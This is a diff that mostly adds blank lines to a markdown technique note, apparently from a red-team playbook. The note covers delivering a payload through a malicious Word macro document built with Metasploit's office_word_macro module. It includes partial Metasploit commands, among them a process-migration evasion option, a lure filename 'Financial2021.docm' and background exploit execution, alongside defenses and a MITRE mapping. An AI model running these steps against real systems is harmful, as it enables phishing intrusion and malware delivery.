@@ -37,11 +37,15 @@ From a technical perspective, this technique involves the creation of a maliciou
 
 From a business perspective, this technique can be used by attackers to steal sensitive information, install additional malware, or gain access to critical systems. It is important for organizations to be aware of this technique and take steps to protect against it.
 
+ 
+
 ## Requirements
 
 1. Access to a system with Microsoft Word installed
 
 1. Metasploit framework
+
+ 
 
 ## Defense
 
@@ -51,6 +55,8 @@ From a business perspective, this technique can be used by attackers to steal se
 
 1. Disable macros in Microsoft Word unless they are specifically required for business purposes
 
+ 
+
 ## Objectives
 
 1. Deliver a payload to a target system
@@ -59,14 +65,24 @@ From a business perspective, this technique can be used by attackers to steal se
 
 1. Escalate privileges once access has been gained
 
+ 
+
 # Instructions
 
 1. This command is used to deliver a payload to a target system using a malicious Office Word Macro. The command sets the payload to be delivered, the IP address and port of the listener, and the name of the malicious document. The DisablePayloadHandler option disables the creation of a payload handler, which is useful when using an external payload handler. The PrependMigrate option causes the payload to migrate to a new process before executing, which can help avoid detection. The exploit command executes the attack and the -j option runs the exploit in the background.
 
+ 
+
+
+
 **Code**: [[use exploit/multi/fileformat/office_word_macro
 set]]
 
+
+
 > The 'use' command specifies the exploit module to use. The 'set payload' command sets the payload to be delivered. The 'set LHOST' command sets the IP address of the listener. The 'set LPORT' command sets the port of the listener. The 'set DisablePayloadHandler' command disables the creation of a payload handler. The 'set PrependMigrate' command causes the payload to migrate to a new process before executing. The 'set FILENAME' command sets the name of the malicious document. The 'exploit' command executes the attack. The '-j' option runs the exploit in the background.
+
+
 
 **Command** ([[Exploit Office Word Macro]]):
 
@@ -80,6 +96,8 @@ set PrependMigrate True
 set FILENAME Financial2021.docm
 exploit -j
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -105,3 +123,5 @@ exploit -j
 
 - [[DOCM - Metasploit]]
 - [[Office - Attacks]]
+
+
